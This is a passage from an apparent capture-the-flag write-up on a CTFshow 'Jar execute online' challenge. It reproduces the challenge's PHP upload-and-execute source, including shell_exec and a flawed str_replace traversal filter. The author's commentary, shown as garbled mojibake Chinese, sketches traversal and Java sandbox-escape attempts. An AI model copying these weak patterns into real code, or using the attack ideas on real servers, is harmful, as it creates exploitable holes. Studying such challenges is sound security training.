string double-quoted-string">"./uploads/"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jar_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$jar_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jar_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$old_name</span> <span class="token operator">=</span> <span class="token variable">$jar_name</span><span class="token punctuation">;</span>        <span class="token variable">$new_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$jar_name</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jar"</span><span class="token punctuation">;</span>        <span class="token function">file_rename</span><span class="token punctuation">(</span><span class="token variable">$old_name</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^[a-fA-F0-9]&#123;32&#125;\.jar$/"</span><span class="token punctuation">,</span> <span class="token variable">$new_name</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"uploads/<span class="token interpolation"><span class="token variable">$new_name</span></span>"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/usr/local/java/bin/java -Djava.security.manager -Djava.security.policy==/usr/local/bin/ctfer.policy -jar uploads/<span class="token interpolation"><span class="token variable">$new_name</span></span> 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$output</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>&lt;br>Jar file executed successfully."</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Invalid jar name"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token function">file_rename</span><span class="token punctuation">(</span><span class="token variable">$new_name</span><span class="token punctuation">,</span><span class="token variable">$old_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">send_redirect_script_after_seconds_with_message</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Jar file not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">file_rename</span><span class="token punctuation">(</span><span class="token variable">$oldname</span><span class="token punctuation">,</span><span class="token variable">$newname</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./uploads/"</span><span class="token operator">.</span><span class="token variable">$oldname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./uploads/"</span><span class="token operator">.</span><span class="token variable">$newname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./uploads/"</span><span class="token operator">.</span><span class="token variable">$newname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">rename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./uploads/"</span><span class="token operator">.</span><span class="token variable">$oldname</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"./uploads/"</span><span class="token operator">.</span><span class="token variable">$newname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CTFER<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">body</span> <span class="token punctuation">&#123;</span>            <span class="token property">font-family</span><span class="token punctuation">:</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>            <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">#layout</span> <span class="token punctuation">&#123;</span>            <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>            <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 100vh<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.header</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #333<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.header h1</span> <span class="token punctuation">&#123;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> 36px<span class="token punctuation">;</span>            <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.header h2</span> <span class="token punctuation">&#123;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> 24px<span class="token punctuation">;</span>            <span class="token property">margin</span><span class="token punctuation">:</span> 10px 0 0 0<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.content</span> <span class="token punctuation">&#123;</span>            <span class="token property">flex</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.content h2</span> <span class="token punctuation">&#123;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> 24px<span class="token punctuation">;</span>            <span class="token property">margin</span><span class="token punctuation">:</span> 20px 0 10px 0<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.content form</span> <span class="token punctuation">&#123;</span>            <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>            <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.content form input[type="file"]</span> <span class="token punctuation">&#123;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.content form input[type="submit"]</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #333<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>            <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> 18px<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.content form input[type="text"]</span> <span class="token punctuation">&#123;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.content form input[type="submit"]:hover</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #555<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.footer</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #333<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>            <span class="token property">bottom</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.footer p</span> <span class="token punctuation">&#123;</span>            <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.grids</span> <span class="token punctuation">&#123;</span>            <span class="token property">display</span><span class="token punctuation">:</span> grid<span class="token punctuation">;</span>            <span class="token property">grid-template-columns</span><span class="token punctuation">:</span> 1fr<span class="token punctuation">;</span>            <span class="token property">grid-template-rows</span><span class="token punctuation">:</span> auto 1fr auto<span class="token punctuation">;</span>            <span class="token property">grid-gap</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">a</span> <span class="token punctuation">&#123;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>            <span class="token property">text-decoration</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.file</span> <span class="token punctuation">&#123;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">padding-bottom</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.file a</span> <span class="token punctuation">&#123;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> 18px<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #333<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.file a:hover</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #555<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>grids<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Jar execute online<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Upload your jar file and execute it online<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Upload your jar file<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index.php?action=upload<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">accept</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>.jar<span class="token punctuation">"</span></span> <span class="token attr-name">required</span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>List of uploaded files<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uploads/*.jar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p class='file'>&lt;a href='<span class="token interpolation"><span class="token variable">$file</span></span>'><span class="token interpolation"><span class="token variable">$file</span></span>&lt;/a>&amp;nbsp;&lt;a href='index.php?action=delete&amp;file=<span class="token interpolation"><span class="token variable">$file</span></span>'>Delete&lt;/a>&lt;/p>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>       <span class="token delimiter important">?></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Execute your jar file<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index.php?action=execute<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jar_name<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jar_name<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Enter jar file name<span class="token punctuation">"</span></span> <span class="token attr-name">required</span> <span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Execute<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Output<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>            <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>legal pure-g<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pure-u-1 u-sm-1-2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Â©                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFullYear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> CTFshow. All rights reserved.                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pure-u-1 u-sm-1-2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Designed by <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ctf.show<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">noopener</span> <span class="token attr-name">noreferrer</span><span class="token punctuation">></span></span>h1xa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°è¯•ç›®å½•ç©¿è¶Šè¯»å…¶å®ƒæ–‡ä»¶ï¼Œä½†æ˜¯è¯»ä¸äº†ï¼Œå› ä¸ºè¿™é‡Œçš„è¯»æ–‡ä»¶é€»è¾‘æ˜¯ rename æ–‡ä»¶è¿‡æ¥ç„¶ååˆ rename å›å»ï¼Œå¯¼è‡´æ²¡æœ‰å†™æƒé™çš„å…¨å¯„</p><p>æ¥ä¸‹æ¥æ€è€ƒæ‰“javaæ²™ç®±é€ƒé€¸</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/local/java/bin/java <span class="token parameter variable">-Djava.security.manager</span> <span class="token parameter variable">-Djava.security.policy</span><span class="token operator">==</span>/usr/local/bin/ctfer.policy <span class="token parameter variable">-jar</span> uploads/<span class="token variable">$new_name</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æµ‹äº†ä¸‹æƒé™ï¼Œæ²¡æœ‰è¯»å†™å‘½ä»¤æ‰§è¡Œï¼Œåªå‰©ä¸ªå…³é—­jvmçš„æƒé™ï¼Œå‡ ç§ç»•è¿‡æ–¹å¼éƒ½å°è¯•äº†ä½†æ˜¯ç»•ä¸è¿‡å»</p><p>å°è¯•åˆ æ‰ &#x2F;usr&#x2F;local&#x2F;bin&#x2F;ctfer.policyï¼Œåˆ©ç”¨replaceæ„é€ ç›®å½•ç©¿è¶Šï¼Œä½†æ˜¯åç¼€é”æ­» .jar äº†</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">delete_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uploads/"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/<span class="token interpolation"><span class="token variable">$file</span></span>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string 